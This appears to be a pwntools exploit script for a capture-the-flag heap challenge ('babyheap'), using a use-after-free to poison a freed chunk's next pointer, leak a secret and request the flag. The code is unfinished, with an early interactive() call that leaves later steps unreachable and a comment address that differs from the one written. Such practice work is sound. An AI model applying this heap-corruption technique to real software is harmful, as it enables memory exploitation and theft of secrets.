#!/usr/bin/env python3

from pwn import * 
import time
binary = './babyheap_level16.0_patched'
p = process(binary)

s = '''
b malloc
b free
'''

#gdb.attach(p, s)

#context.log_level = 'debug'

# parsing the address leak 


p.sendline("malloc 0 100")
p.sendline("malloc 1 100")


p.sendline("free 0")
p.sendline("free 1")

# uaf
# overwriting the next* pointer with address of secret -- 0x42a528
p.sendline(b"scanf")
p.sendline("1")
p.sendline(p64(0x426800)) # 8 bytes before destination


p.sendline("malloc 1 100")

gdb.attach(p, s)
p.interactive()




p.sendline("malloc 0 100")


p.sendline("free 1")


p.sendline("puts 1")


p.recvuntil(b"Data: ")
data = b""
while True:
    c = p.recv(1)
    if not c or not c.isalpha():
        break
    data += c

print(f"Extracted string: {data.decode()}")
print(data)
time.sleep(1)
p.sendline(b"send_flag")
time.sleep(1)
p.recvuntil(b"Secret: ")
p.sendline(data + b'\x00' * 8)


p.interactive()



